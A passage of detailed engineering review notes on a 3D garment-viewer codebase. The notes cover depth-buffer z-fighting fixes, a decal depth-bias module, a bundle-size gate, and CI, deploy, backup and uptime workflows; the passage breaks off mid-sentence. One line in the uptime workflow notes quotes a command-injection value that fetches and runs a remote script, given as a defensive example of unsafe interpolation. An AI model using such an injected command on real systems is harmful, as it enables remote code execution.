- Depth buffer precision not linear: resolvable step at z grows with z²: `step = (1/(2^bits-1)) * (far-near) * z²/(far*near)`. model-viewer pins `near` **0.00436 m**, never moves. CLO stacks printed graphic a fixed **0.100 mm** above cloth. 24-bit buffer measured live: 1.2 m (zoomed in) step 0.0196 mm = 5.1× margin → clean; **2.18 m (zoomed out) step 0.0650 mm = 1.5× → FIGHTS.** Below ~3× GPU can't reliably order the two surfaces → different winner per pixel/frame. Doubling distance quarters precision — why pulling back made it worse.
- ⚠️ Fixed near plane = wrong fix, first thing tried: 0.5 m gives 199× margin at full zoom-out but CLIPS the garment anyone zooms closer than half a metre. Near must FOLLOW the camera: derived from camera distance to model surface on every read; at 2.18 m yields ~0.8 m ≈ 350× margin; zoomed in shrinks with camera, never crosses in front.
- ⚠️ DOES NOT RESCUE EVERY GAP, must not be sold as if it does: margin ∝ gap → closer-layered garments stay marginal; `decal-depth-bias.ts` still covers that case. Raises floor for whole catalogue; doesn't replace per-material fix.
- ⚠️ Paragraph's old number was WRONG: said p001 "recorded at 0.001 mm, a hundredth of Minecut's". Re-measured 2026-08-29 (`pipeline overlays output/production/p001.glb --json`): p001's smallest gap ANYWHERE **0.0418 mm**; among detector-classified stacked surfaces **0.1281 mm** (range 0.128–0.2035) = forty times what was claimed. Negative control across all ten production garments returned visibly different answers rather than a constant → instrument was reading the files.
- ⚠️ CONCLUSION STANDS ANYWAY — not because of this number: p001 needs the bias because someone RENDERED it — bias off → chevrons break into fragments, "NEVER LOOK BACK" fills with holes; n001 (unaffected) is the control making that trustworthy (review-server.ts, 2026-08-27). Do NOT retire decal-depth-bias.ts on the corrected figure; rendered evidence is the authority, arithmetic margin has never been one.
- ⚠️ Property override NOT assignment: model-viewer recomputes near from framed model on every camera change → anything written is undone on next interaction = precisely when defect appears; getter read at projection-matrix rebuild = always current, can't be clobbered. Cost: reaches into three.js camera internals (same class as decal-depth-bias) → fails SAFE: anything missing → install skipped, viewer keeps model-viewer's own behaviour rather than throwing.
- `NEAR_FRACTION = 0.5` exported so review-server.ts holds a pinned second copy — that page must render what production renders or it answers a different question; it has already misled the owner once by lacking the decal bias. `MIN_NEAR = 0.01` (camera inside bounding sphere; at/below 0 collapses projection).
- `boundingRadius`: half box DIAGONAL not half tallest side — orbiting camera can sit off any axis; tallest-side under-estimates reach on diagonal, would let near plane cross in front of a sleeve. Non-finite dims → 0.
- `internalCamera`: ⚠️ TWO model-viewer internals expose `.camera` — `Symbol(scene)` = three.js Scene; `Symbol(controls)` = orbit controller holding same camera but NOT an Object3D. Selecting on `.camera` alone returns whichever enumerates last → select on SCENE by `isObject3D`, take camera from it. Correct on model-viewer 4.3.1, silent no-op if future release renames → returns null not throwing; caller treats false as "keep old behaviour".
- `installAdaptiveNearPlane`: readOrbitRadius called on every read not captured (value changes as visitor zooms); `set: () => {}` swallows model-viewer's own writes (without it override lasts until first drag); non-configurable near on future three.js → leave alone, return false (degraded render, never broken).

## 12. apps/viewer/src/lib/decal-depth-bias.ts (338 lines) — READ 2026-09-22
- DEFECT (2026-08-27): graphics "flicker or speckle" — decal authored coplanar with garment → near-identical depth values, GPU can't decide, winner changes per pixel/frame = classic z-fighting, worst when garment moves.
- ⚠️ glTF 2.0 CANNOT EXPRESS A POLYGON OFFSET (no material property) → file-based pipeline's only lever = physically moving decal geometry off the surface = the approach that tore multi-panel prints open along seams. three.js HAS the setting → viewer applies it without touching a vertex — fixes every garment at once INCLUDING already-published ones, nothing reprocessed.
- ⚠️ Reaches into model-viewer internals DELIBERATELY WITH A GUARD: `Material[$backingThreeMaterial]` unique symbol, works 4.3.1, could disappear in any upgrade, failure SILENT (no error — flicker quietly returning) = exact shape this repo keeps paying for (secrets scanner reading 60 bytes, instrument measuring nothing for 167 loads, uptime check green against 404) → `decal-depth-bias.test.ts` asserts symbol still declared in installed package's type definitions, fails build if not.
- TWO ANSWERS because TWO DEFECTS: (1) CUT-OUTS detected here — after solidifyMaterials printed decal is alphaMode MASK = three.js `alphaTest > 0`; (2) OPAQUE printed layers stacked on cloth flagged by PIPELINE into material `extras`, merely obeyed here.
- ⚠️ Comment said "Only cut-outs" until 2026-08-28 → left owner's ACTUAL defect unfixed for a whole session: fabric-OPAQUE-and-never-pull-forward is true of the garment BODY, false of a printed layer ON the body — CLO stacks exactly that, two OPAQUE ~0.1 mm apart; pale layer punches through as white specks appearing/vanishing as garment turns. Distinction is GEOMETRIC, unmakeable from here (model-viewer has flat material list, no idea which panel) → `overlay-depth.ts` measures once per primitive, records decision in file. Sheer BLEND panels + fabric with nothing in front left alone.
- ⚠️ DV-01 (fixed 2026-09-03): EVERY three.js material behind the wrapper, not the first — wrapper holds a SET (`$correlatedObjects`); `$backingThreeMaterial` merely first entry. On colourway switch `PrimitiveNode.setActiveMaterial` binds a material from that set or adds mesh's own → GPU's material often NOT the first. Writing first alone counted as success while scene drew another: measured live skinsuit — wrapper backings in scene fell 44 → 5 after first colourway click, bib drew 0 of 5 biased. Now every entry written; e2e probe counts what the SCENE holds, not what wrappers report.
- `DepthBiasTarget.userData`: extras survive via GLTFLoader `assignExtrasToUserData` (`Object.assign(material.userData, def.extras)`) + `Material.copy` deep-clones → pipeline decision reaches renderer w/o new format/sidecar/name lookup. Verified real browser model-viewer 4.3.1 / three 0.183.2, un-annotated file negative control: 0 materials carried record before annotation, 1 after.
- Result fields: `overlays` reported separately (collapsing them is how the second defect stayed hidden); `rejected` = record outside band (stale asset/hand-edit/future detector — refusing loudly beats applying unmeasured bias); `pending` = colourway not loaded yet, EXPECTED not a fault (model-viewer builds only arriving variant; KHR_materials_variants-only materials are lazy stubs w/ empty Set; `variant-applied` catches them); `targets` = materials actually written (on five-colourway garment > biased.length = DV-01 visible); `unreachable` ⚠️ THIS COUNT USED TO INCLUDE `pending` → THAT is why the bug survived: measured 2026-08-27 live: 6 of 26 decals biased, **156 counted unreachable** — all merely lazy — nothing read the number, four of five colourways kept flickering in silence. Split so alarming case reportable without 156 rows of noise.
- ⚠️ OFFSET −1/−1 until 2026-08-28, −1 DID NOT FIX FLICKER (owner still saw shattered artwork with bias ON = what reopened this). Measured all 16 processed garments from fixed camera: −1 → −8 changes 1.647% of p001's pixels, 0.793% of d001's — holes in print closing; p001's chevrons + "NEVER LOOK BACK" eaten-through → solid. Damage still visible at −4; −8 → −128 indistinguishable → **−8 is START OF A WIDE PLATEAU** not a knife edge (why −8 not the −4 that also nearly works).
- ⚠️ Old comment claimed −1 was "smallest bias that reliably separates two coplanar surfaces" + "larger values bleed far-side decal through to front": first half FALSE (−1 leaves p001 destroyed); second real but threshold wrong by two orders of magnitude: n001 (tightest garment, front/back closest, the one that is LIVE) — nothing changes at −8 or −64 (0.000% pixels); first change −512 (0.009%), 0.168% at −4096 → **−8 carries ≥64× margin**. On garments −8 does change, change SATURATES at −8, doesn't grow through −4096 = damage repaired not decal bleeding. n001 0.000% = safety argument for live product: cannot alter already-published garment.
- `MIN_ABS_OVERLAY_BIAS = 8`, `MAX = 64`: ⚠️ −1 DELIBERATELY OUTSIDE band (shipped 2026-08-27, left p001 destroyed, 8× too weak, no test caught it — every assertion checked bias APPLIED, none checked STRONG ENOUGH). POSITIVE outside too, worse direction: pushes decal AWAY from camera, behind cloth it's printed on.
- `readOverlayBias`: VALIDATED not trusted (userData is whatever file said; disabled/mis-typed/too-wrong-sign refused + counted — silent wrong value is precisely the failure this module exists to undo).
- `applyDecalDepthBias`: takes backingsOf accessor as argument (testable without browser/GPU/real element — none exist under jsdom). TWO MECHANISMS ONE LEVER: alphaTest (cut-out, three.js exposes directly, needs nothing from file) vs pipeline depthBias record (opaque layer — property of GEOMETRY not material, only pipeline sees it). ⚠️ Case 2 here BECAUSE ITS ABSENCE COST A WHOLE SESSION: skip used to reject everything not a cut-out ("biasing garment body would push through what's behind") — right about BODY, wrong about printed layer ON body; hiding Minecut Motion's graphic turns skirt 100% white; biasing that one layer takes Minecut **5.196% white specks → 0.002%**. ⚠️ Still NOT bias-every-opaque: p001 body panel frontness 0.34 rejected, artwork 0.58–0.64; n001 (source of LIVE product) comes out of pipeline BYTE-IDENTICAL, nothing flagged.
- Assignment NEVER accumulation — runs again on every `variant-applied`; anything that ADDED would deepen bias each colourway switch until far-side decal bled through front.
- `correlatedThreeMaterials`: Set under `Symbol('correlatedObjects')` looked up by description (deep import not in export map); lazy colourway material holds null/empty Set → [] → pending; if symbol ever gone falls back to single backing = repair degrades to 2026-08-27 behaviour not nothing, and e2e scene count fails loudly (the point of counting the scene).
- `backingThreeMaterial`: by DESCRIPTION not import (deep import `@google/model-viewer/lib/...` not in export map = breaks bundle rather than degrade); prototype getter walk-up; returns null when not found → caller reports, test fails build if API gone.

## 13. apps/viewer/src/lib/fetchWithProgress.ts (97 lines) — READ 2026-09-22
- Exists because `<model-viewer>` won't tell us: its `progress` event carries `{totalProgress, reason}` only — inside CGLTFLoader real `event.loaded/total` collapsed to ratio on one line and thrown away; surfaced number blends GLB with environment HDR = not even about the garment alone. Verified @google/model-viewer 4.3.1.
- `media.wear-run.help` makes it workable: sends `content-length` (28,271,780 for N001), no `content-encoding` so figure is real transfer size, allows viewer origin to read it.
- ⚠️ Caller MUST treat rejection as "use the plain URL instead", never an error to show: every failure mode (offline/CORS/5xx/aborted navigation) is one where handing URL straight to model-viewer still works = exactly what shipped before this existed.
- ⚠️ A 200 IS NOT ENOUGH — missing model arrives as an HTML PAGE: `media.wear-run.help` = R2 public bucket domain, no Worker → missing key gets Cloudflare's own branded error document. Measured live 2026-09-05: `GET /<missing>.glb` → 404 text/html 27,150 bytes `<title>Not Found</title>`. 404 caught above; NOT caught: same document with 200 — exactly what an edge rule/interstitial/misrouted custom domain does. Without check those bytes reach model-viewer, three.js parses HTML as GLB → unhandled parse error instead of branded "reference unavailable" with Email+WhatsApp.
- Checks TYPE not sniffed bytes: GLB begins `glTF` magic but truncated/compressed body fails that for reasons ≠ "this is a web page", and turning a slow connection into an error is worse than the bug being fixed.
- total = 0 not NaN when header absent/invalid: percentComplete + secondsRemaining treat non-positive total as "cannot promise a percentage" → null = honest readout; NaN would propagate into formatters. No stream → blob fallback still reports. loaded CUMULATIVE (reporting chunk size would send the bar backwards after first chunk).

## 14. scripts/check-bundle-budget.mjs (352 lines) — READ 2026-09-22
- WHY alongside Lighthouse: lighthouserc byte budgets are good BUT the job enforcing them is deliberately NOT in ci.yml `needs:` (needs Chrome; "a Chrome flake must never block a live release") → the only automated statement about site weight CANNOT FAIL A DEPLOY: regression lands, check goes amber, nothing stops it. This closes the gap from the other side: no browser/network/rasteriser/scoring model — reads built files off disk, adds up bytes. Nothing that can flake → CAN gate the deploy, and it does.
- ⚠️ WHAT IT DOES NOT COVER: measures the SHELL (scripts/styles/fonts/wasm). Real garment = 8–40 MB GLB fetched from R2 at runtime, never in `dist/`. Green run ≠ "page is light". Model weight enforced where models pass through: SIZE_WARNING_BYTES (shrink report) + GLB_HARD_MAX_BYTES (CMS upload guard), both packages/shared/src/media.ts.
- gzip not raw: Cloudflare compresses text on wire (raw overstates text 3–4×; budget against raw measures something no visitor experiences); gzip at fixed level deterministic across machines = property making it safe to gate on. Brotli closer to edge reality BUT output shifted between zlib versions; gzip has not. Tracks regressions, not a transfer-size promise.
- Budgets deliberately small headroom: first lighthouse draft used 3.5×/6× real figures = would pass any regression short of catastrophe. Measured 2026-08-12 gzip lvl 9: script 542,205/624,000 (+15%), wasm 307,717/339,000 (+10%), font 275,187/317,000 (+15%), stylesheet 5,018/7,000 (+40%). Ratios each an argument: CSS loosest (genuine design change moves it most; 40% of 5 KB = 2 KB, hides nothing); decoder took wasm's +10% then gave it back (+10% → clean build sits 91%, prints "at or above 90%" EVERY run — a warning that always fires is one people scroll past, costs more than tightness buys; decoders now have own line in --report); script carries two biggest items (model-viewer 279 KB gz, draco_decoder.js 104 KB gz) — 15% ≈ 81 KB, smaller than any accidental dependency, larger than churn.
- ⚠️ RE-CUT 2026-09-04 BECAUSE ONE SENTENCE WAS FALSE AND LOAD-BEARING: old text said script "deliberately includes vendored decoders in public/… shipped to visitor so they count" — true of meshopt_decoder.js, FALSE of draco+basis: production is 100% meshopt (shrink.ts), meshopt preloaded from index.html, and index.html itself says "draco and ktx2 are not preloaded because nothing served uses them" — no visitor ever fetched a byte. Measured: app shell (incl meshopt) 412,409 B gz / 11 files; draco+basis never-fetched 441,238 B gz / 5 files = **more than half of what the gate measured was files nobody downloads**, masking the shell twice over (wasm category 100% decoders at 91% reporting headroom warning about number no visitor experiences; 119 KB decoder JS inside script made real shell look closer to ceiling).
- ⚠️ NOT the "raise a budget to go green" move CLAUDE.md forbids — difference matters: nothing exempted/loosened; decoders keep a gate of their own cut tight to measurement (decoder bump still deliberate); what changed = they stopped being counted as part of shell, because they are not. BOTH BUDGETS WENT DOWN.
- ⚠️ DO NOT DELETE THE DECODERS TO "FIX" THIS: viewer CLAUDE.md records draco decoder-location fix UNVERIFIED, keeps path open for future draco garment; KTX2/basis refused for quality not removed. Deleting turns re-enable into debugging session.
- Measured 2026-09-04: script 412,409/474,000, decoder 441,238/507,000, wasm 0/20,000 (tripwire), font 275,187/317,000, stylesheet 6,047/7,000. `wasm` matches ZERO files by design: every .wasm is a decoder gated under `decoder`; next real WebAssembly should FAIL this and force a decision — category matching nothing with 339,000 B ceiling would wave through a third of a megabyte in silence ("gate measuring nothing" failure this repo keeps paying for).
- `expectEmpty: true` = the ONLY category exempt from collapse floor — floor catches category that STOPPED being emitted (copy-decoders.mjs writes public/draco/ at build; a missing decoder stopped every production model rendering in July). CEILING still applies = whole point of keeping category. ⚠️ NOT a rule against getting smaller: genuinely halve a category → LOWER THE BUDGET in same change (floor measured against budget, re-baselining is the intended way past it).
- FLOOR_AT 0.5 chosen against live figures not round: four categories sat 72–91%, nearest 22 points clear. WARN_AT 0.9: N4 2026-08-18 wasm 91% — script failed at 100%, silent at 99% → first signal of weight problem was a red deploy; slope not second cliff, NEVER changes exit code; failure path re-verified by temporarily lowering a budget below measured size, confirming exit 1, restoring.
- Checks: unset budget (≤0) → exit 1 ("A budget of 0 is not 'no budget', it is an unfinished one"); collapses → exit 1 with `::error::` GitHub annotation; over-budget → exit 1 ("real regression in what every visitor downloads, not a flake — nothing varies between machines"; raise ONLY with measurement, "it went over" is not a justification, neither is "it is only a bit more"); warnings → stderr, exit 0.
- gzip everything even wasm/images (barely compress) so the number means the same thing in every row. DECODER_DIRS path-based not extension-based (split runs through both .js and .wasm); meshopt_decoder.js deliberately NOT there (dist root, preloaded, every model needs it).

## 15. .github/workflows/ (8 files) — ALL READ 2026-09-22
Condensed; each file's own header carries the full evidence trail.

- **ci.yml** (gate-order source): concurrency group QUEUES on `main`, cancels on PRs — never `cancel-in-progress: true` on main (this run MIGRATES D1 then deploys; mid-flight cancel can leave DB upgraded + site on old code, and cancellation fires no failure alert = worst outcome is the quietest). Two merges ten minutes apart caused this. `gh run watch --exit-status` returns 1 for CANCELLED as for FAILURE — read `conclusion`, not exit code. `permissions:` block REPLACES defaults (this repo's scar: 8301e60 added checkout to uptime.yml listing only `issues: write` → checkout failed "Repository not found" — GitHub answers 404 not 403 on private repo → reads as deleted repo; ~23h silent). Expression in cancel-in-progress may use only `github`/`inputs`/`vars` contexts (`github.ref` OK; not `secrets`/`env`) — Audit L14-01. Container job: Playwright image pull paid every run, cannot cache (hosted runner ephemeral, container pulled before first step; layer-caching posts describe self-hosted). Measured not predicted: apt baseline 107s vs container cold 183s / warm 142s → steady **+35s per run**. Pull mostly stable: seven pulls = 36/38/38/38/39/40 + one **60s**, median 38 — an earlier comment said "38s in every run" (true of first three, stopped being true) → if stating what a step costs, state the spread.
- **lighthouse-live.yml**: own workflow, NOT a ci.yml job — ci.yml queues on main (D1 migrate + deploy); 40 LH runs ≈17 min on the owner's Mac would hold that queue. Blocks nothing (runs after deploy); failure reaches owner via GitHub workflow-failure notification — deliberately NO third untested copy of the issue-opening shell (test-alert-shell.sh exists to exercise one). ⚠️ 403 from runner = INCONCLUSIVE not failure (Bot Fight Mode blocks datacenter traffic; Lighthouse *scores* a blocked page rather than erroring — robot reads each report's own status code and sets 403/429/503 aside; too-few-valid-runs = "not judged"; if most runs blocked → robot belongs on owner's Mac per spec §4.2, ask owner). Also weekly (home phone score fell 96→86 Sept 11–15 2026 with NO code change — server response time; deploy-only robot never sees drift). Watched by heartbeat for COMPLETION not success (failing is its job when a page regresses). Egress ~38 MB/run. `permissions: contents: read`. Only green PUSH counts (workflow_run also fires for PR runs; branches matches HEAD which a fork may name main). Lighthouse pinned as devDependency (passes lockfile/release-cooldown/Socket; `npx lighthouse@x` bypasses all three).
- **deploy-shrink.yml**: separate shrink Worker+Container deploy; kept out of ci.yml because wrangler deploy builds Docker. ⚠️ CLOUDFLARE_API_TOKEN must be CUSTOM with Containers:Edit + Cloudchamber:Edit (wrangler routes container work through its cloudchamber client; its OAuth requests `containers:write` AND `cloudchamber:write`) + User Details:Read or every run ends "Unable to retrieve email". Paths glob: `!tools/asset-pipeline/**.md` must come AFTER positives (later `!` excludes earlier match; `**.md` = GitHub extension idiom) — c0a6728 built and pushed a Docker image for a docs-only commit. ⚠️ EVERY JOB PREFIXED `shrink-` LOAD-BEARING (audit L14-06): old names (verify/artwork/audit/secrets/deploy) collided with ci.yml required status checks; a skipped job publishes `skipped` conclusion which a ruleset counts SATISFIED → adding one pull_request trigger line would let the merge gate be satisfied by four jobs executing nothing. ⚠️ No `needs:` at all until 2026-08-03: shipped container image whether or not verify passed — the one code path every real garment goes through was the one nothing gated. Deliberate COPY of ci.yml checks, not workflow_call (coupling = viewer e2e flake blocks pipeline fix). ⚠️ `pnpm lint` MISSING until 2026-08-30 + bare `pnpm test` = vitest evaluates `thresholds:` ONLY with --coverage → this workflow (ships artwork-decimating container) enforced NO coverage floors, NO lint. Generalized trap: two workflows duplicate the same gates → a fix to one is half a fix (gitleaks wrong here 3 months; container fix 10 days). shrink-artwork added 2026-08-08 (was backwards: ci.yml gated its deploy on eval:artwork while THIS workflow — touching decimation — ran typecheck+unit only; three blocking gates test alphaMode which decimation never changes; sweep run F rendered the wordmark illegible with `wouldShip: true`; this eval is the only automated thing looking at the letters). NO apt any more (2026-08-18 Azure mirror: apt ate job budgets; `timeout-minutes` kills the step's SHELL not apt-get → orphan holds dpkg lock → retry exits 100; raising the ceiling only moves which job dies). ⚠️ `container:` still mcr playwright:v1.62.1-noble — FROM tag must equal @playwright/test version or the render harness fails "browser not found"; workflowHardening.test.ts asserts agreement; bumping PW = rebuild image. shrink-audit: audit-ci exits 1 for BOTH finding AND unreachable registry; retry ONLY on `ERR_SOCKET_TIMEOUT` signature (a real advisory prints its list and must fail the first attempt — never turn a finding into a pass); audit-ci's own retry is inert for pnpm (`PARTIAL_RETRY_ERROR_MSG` pnpm: [] upstream, checked audit-ci@7.1.0). 2 attempts not 3: 460s fixed + 3×270 + 2×15 = 1300s = 21.7 min > 20 ceiling (arithmetic, not taste — do NOT raise the ceiling); a retry cannot outlast the runner-network condition ("Re-run this job" is for that). Trivy: gate scoped `vuln-type: os` — base image has 1 CRITICAL (CVE-2026-59873, tar in npm's OWN bundled node_modules) fixed upstream, not fixable from this repo → unscoped gate blocks EVERY shrink deploy on a CVE nobody here can close = how a gate gets switched off. Input is `vuln-type` NOT `pkg-types` (action.yaml TODO; unknown inputs are IGNORED silently by Actions → unscoped scan while looking correct). Digest read FROM the Dockerfile, not repeated (second copy of the pinned value = same defect as the required-checks list being a second copy of deploy.needs). `-z` guard as much as grep (empty ref = scan nothing + pass). `TRIVY_IMAGE_SRC: remote` load-bearing 2026-09-08: Trivy prefers the daemon; runner mounts host socket; host arm64 Mac holds arm64 variant under amd64 digest → "not found" reads as a corrupt pin, is neither. `exit-code: '0'` does NOT make the step informational (governs findings exit; a scanner CRASH still fails the step) → `continue-on-error: true` needed. GitHub cache service = slowest thing on self-hosted (cache restore 10m08s = GitHub's own timeout, save 6m02s → job timeout) → cache false + /trivy-cache on runner volume; raising timeout-minutes is the wrong fix. shrink-secrets: ran the gitleaks BINARY not the commercial action — action unlicensed on org = "0 commits scanned, no leaks found, exit 0" while fetch-depth:0 pulled whole history (worse than the ci.yml case). Wrapper free for personal, PAID for orgs, degrades silently. BOTH arch checksums needed since 2026-09-08 arm64 runner (hardcoded linux_x64 not executable on arm64; shrink-secrets sits in shrink-deploy.needs → blocks container deploy — "fix to one workflow is half a fix, grep the other" happened AGAIN with arch). VERIFY archive sha256 BEFORE unpack (L9-06: downloaded a binary over the network and RAN it; only check was `gitleaks version` prints — proves bytes are *a* working executable, not *whose*; tool whose job is stopping secrets leaving the repo). shrink-deploy: OFF by default (SHRINK_DEPLOY_FROM_CI var) — image builds fine (135 MB, 54s) but PUSH: measured upload 85 kB/s → 135 MB ≈26 min + `net/http: timeout awaiting response headers`; downloads fine (1.3 GB Trivy DB ~3 min) = asymmetric home broadband; replacement = Cloudflare Workers Builds (owner chose 2026-09-08). ⚠️ CONSEQUENCE: Workers Builds deploys on push INDEPENDENTLY of these four gates; `needs:` stops THIS job, cannot stop Cloudflare's — until gates are expressed as the Workers Builds build command (RUNBOOK), a pipeline change failing shrink-artwork can still reach the container. `DOCKER_DEFAULT_PLATFORM: linux/amd64` (arm64 Mac would silently ship an arm64 image Cloudflare cannot run). `run: |` not plain scalar (plain YAML folds newlines to spaces → trailing `\` literal → bash reads `\ ` as escaped space, command silently loses its flag boundary — written wrong first, 2026-08-31). Assert arch BUILT not asked (wrong-arch deploys clean, fails only when a garment is processed; drift check can't see it — the image DID move; asymmetric: no local image = WARNING, arm64 found = ERROR — only positive evidence of the defect fails). Alerting: `wrangler secret list` showed a required secret never set; sentry.ts deliberate no-op without DSN — a failed garment told nobody while code looked correct. SHRINK_SENTRY_DSN not SENTRY_DSN (L6-08: old name carried the VIEWER's DSN → pipeline failures would file into the browser project). Gated inside shell not job env (job env would put the DSN in `pnpm install`'s environment too). Drift check: asserted NOTHING until 2026-08-30 (printed timestamp + table + exit 0 = "a human will compare two numbers in a log" = no check); compares LAST MODIFIED vs t0 captured BEFORE deploy (after would make the image always look older); parse failure → WARN not fail a good deploy.
- **nightly-backup.yml**: `permissions: contents: read` stated on purpose (holds CLOUDFLARE_API_TOKEN and exports a DB containing password hashes; upload-artifact unaffected — runtime artifact token). Queue, never overlap (two exports writing the same stamped paths; half-finished worse than late). `environment: production` = step 1 of 2 (secrets still repo-level; done the other way round the secret resolves to an EMPTY STRING → fails at the first wrangler call silently, on a schedule, at night; was HALF-DONE until 2026-08-30 — deploy jobs had it, scheduled jobs didn't → would have taken out backup + digest while deploys looked fine). NO cache (holds production token — pnpm store from a secretless job is the shape of the TanStack 2026-05-11 compromise). ⚠️ BACKUP LOCK 2026-09-10, day after the repo went public: ANY signed-in GitHub account can download workflow artifacts → D1 dump (password hashes, encrypted API keys) + R2 mirror (unpublished media) encrypted with `age` to the owner's PUBLIC key (.github/backup-recipients.txt; private half only the owner; restore in BACKUP-RESTORE.md). age installed from official release + checked against GitHub's published SHA-256 (a swapped download must stop before encrypting the DB with an attacker's binary); early in the job (the lock steps run `if: always()` and must find age even after a failure). Secrets SCOPED to steps 2026-08-30 (job-level env put Workers/D1/R2-editing token in `pnpm install`'s env where a malicious postinstall could read it; minimumReleaseAge:1440 narrows, does not close). Verify backup restores nightly: replays .sql into in-memory SQLite (node:sqlite, built into pinned Node 24 — no new dep), FOREIGN KEYS ON deliberately (root CLAUDE.md: migration "reported success while cascade-deleting two tables"; a dump that restores only with checks disabled already has that problem), checks claimed rows + products/users/site_settings/media non-empty — `wrangler d1 export` exit 0 means nothing (truncated upload, mid-INSERT cutoff, perfect dump of empty DB all exit 0; all discovered during a real restore after data was gone). A human restore drill once found the instructions broken — same drill on a schedule. Second home L2-05: run-private bucket, prefixed `run-apparel-viewer-db/` (two apps' dumps must not be confused during a restore = the moment nobody reads carefully), AFTER verify (an unverified dump is not a backup; copying one further spreads false safety). ⚠️ Absolute path ($GITHUB_WORKSPACE/$dump): `pnpm --filter` runs wrangler with cwd in apps/cms → repo-relative path doesn't exist from there; every nightly run from 2026-09-01 failed there while export+replay+artifact all passed — the second home had never received a single copy (found 2026-09-03). Roundtrip read-back (`wrangler r2 object put` exits 0 on a great many things; size vs disk = difference between "we ran an upload" and "the bytes are there"). Lock BEFORE leaving runner, `if: always()` (a failed-verification dump is still evidence; job red either way). No key → fail, nothing uploaded (upload takes only .age; publicRepoGuards.test.ts fails if any workflow uploads non-.age under backups/). Artifact retention: the repository's own setting CAPS what's requested (asked 90 → given repo's 30). Mirror: full Mondays, apex PDFs nightly (until 2026-08-31 the else-branch did nothing → customer-facing PDFs had up to a SIX-DAY backup window; deletion in run-assets by a separate run-apparel site = somebody else's ordinary Tuesday). ⚠️ Retention arithmetic died with plan changes: Enterprise 50 GB → Free 500 MB pooled (2.69 GB stored → every workflow failed at startup for a day — "BuildFailed", no jobs) → Team 2 GB → repo under ~0.6 GB: 21d full / 3d PDFs / 90 = history. 2026-09-09/10 org gone, personal account, PUBLIC, mirror now ENCRYPTED; GitHub documents quotas only for private repos, nobody measured public → short windows stay; 2026-09-11 staff answer says public artifacts don't count toward storage and first encrypted runs uploaded 160.5/71.3/2.4 MB with no error — windows stay until the quota is actually measured. Archive bucket VERIFIED not mirrored (5.7 GB fixed GLBs + 10 raw exports existed once on one disk, no backup — CI-02/CI-08; mirroring 5 GB nightly spends storage on files that change only on re-export): list the bucket + compare byte counts vs committed archive-manifest.json; red if missing/wrong size AND red if listing or manifest is EMPTY (checked-nothing must not exit green — backup-r2 lesson L20-11); proven both ways 2026-09-02. Events prune 180→90d (H1 owner decision). ⚠️ H1 claimed NO automated retention + "manual action" — wrong about the mechanism, RIGHT about the gap (nothing MEASURED growth); gap closed in diagnostics-digest (this workflow holds only contents:read, cannot open issues).
- **uptime.yml**: no longer liveness — DEEP daily check (was `*/15`: measured 1,200 Actions min/month ≈60% of the 2,000 Free allowance, because GitHub rounds EVERY job up to a whole minute — a 12-second check costs a full one, 40×/day → exhausted quota, GitHub then refused ANY job → stopped a deploy). Liveness moved to the external service (polls every 5 min, 0 Actions minutes). What stayed: smoke-viewer-payload (resolves the model URL out of the live API payload and fetches it — a garment that silently lost its GLB is caught) + apex-probe (marketing site answers on apex, PDFs actually serve) — neither expressible as HTTP/keyword check. ⚠️ Old comment claimed the catalogue probe asserts the redirect lands on the PDF — it never did (tested only that a 3xx carried a non-empty Location, never where it pointed; by then there was no redirect at all). Cron = a request not a guarantee: measured 100 runs, GitHub delivered 27% of requested rate, median gap 44.7 min, worst 6.1 h — never read it as detection time. ⚠️ `permissions:` REPLACES defaults: only `issues: write` → contents=none → checkout on private repo fails 404 "Repository not found" (not 403 → reads as deleted repo); 8301e60 added checkout 2026-08-05, every scheduled run died at checkout ~23 h, monitor never reached the ping, failures looked like ordinary uptime alerts. SMOKE_BROWSER_GET=1: HEAD and GET land on DIFFERENT edge cache entries (measured 2026-08-06: HEAD 200 correct content-length, GET cached 404 for a file intact in R2 the whole time); was off because "runs every 15 min + extra request pointless" — BOTH halves stale (daily since 2026-08-18; cached-404 stopped being a 30-day condition 2026-08-31 status_code_ttl 10s). L6-02. VIEWER_URL /n001/navy → retired slug returns 200 forever (retired slug correctly falls back to the default colourway — fallback is what a printed QR tag depends on → monitor must not point at one). ⚠️ Then the product drifted too (n001→rxps 2026-08-15; /n001/wine 404 all along) and this job stayed GREEN six consecutive successes — the viewer is an SPA: any URL returns 200 HTML then renders "REFERENCE UNAVAILABLE" client-side. A status check proves a web server answered, not that a garment exists. CATALOGUE_URL removed (second copy of siteSettings.catalogueUrl — CMS-owned, per-product overridable = the exact shape of n001→rxps drift). TARGET_OVERRIDE via env not `${{ }}` interpolation (a quoted "$VAR" tests inert whatever it contains; `"; curl evil.sh|sh; #` would execute — never externally reachable, but the shape is the bug and the next person may not be lucky). --retry 2 --retry-all-errors (a single 20s sample on a best-effort cron decided whether to page the owner; a transient blip opened an outage issue for a healthy site; plain `--retry` retries only transient HTTP codes, not the connection failures a real outage produces). ⚠️ 403/429/503 INCONCLUSIVE never failures (Bot Fight Mode already forced a rollback + failed a deploy; `-f` makes 403 a hard failure → outage issue on Cloudflare's mood → training the owner to ignore the alarm = how this check sat dead 17 days). apex-probe: asserts /catalogue /profile stay retired (410, never a PDF), private hosts refuse without code, apex serves the site. History: once asserted a 301 to Google Drive, red on a healthy site for days, still concluded success because `ok=false` was only a shell variable — the probe must exit non-zero itself. zone-security-probe: headline incident shape (apex Worker hand-edited in dashboard 2026-08-28, nothing in repo could see it; 2026-08-30 applied six more control-plane changes; prose in CLOUDFLARE-LIVE-CHANGES.md, only this notices them being undone); cheap (12 TLS handshakes + 4 1-byte ranged GETs); a run that reached NO host emits ::warning:: not silent green. ⚠️ Alert: old rule "if open outage issue exists do nothing" has no sense of TIME → issue #2 opened 2026-07-21 never closed → 17 days every failure would have turned the workflow red and notified NOBODY. Fix = comment on the open issue instead of staying quiet (GitHub notifies on comments; quiet window ≈1 notification/90 min vs 4/h; first failure after a long-stale issue speaks immediately). printf not `"\n"` in double quotes (bash doesn't expand → issue #2 carried a literal backslash-n). `// empty` load-bearing (empty array → "null null" literal → -z fails → comment on issue #null instead of creating the FIRST issue — the no-issue-yet path every genuine first outage takes). ⚠️ Fail-the-run step's POSITION load-bearing: Alert guarded by `if: steps.check.outputs.ok == 'false'`; GitHub inserts implicit `success() &&` before any if: lacking a status function → a check exiting non-zero skips the ALERT (no issue, no comment); failing inside check trades a lying green tick for a dead alarm, strictly worse. Run must fail because until 2026-08-30 ok=false was only a shell var and the run concluded success (Actions ticked while the log showed ##[error]; heartbeat watches for successful runs → false green blinded the watchdog too). Do NOT "simplify" Alert to `if: always()` — test-alert-shell.sh extracts the 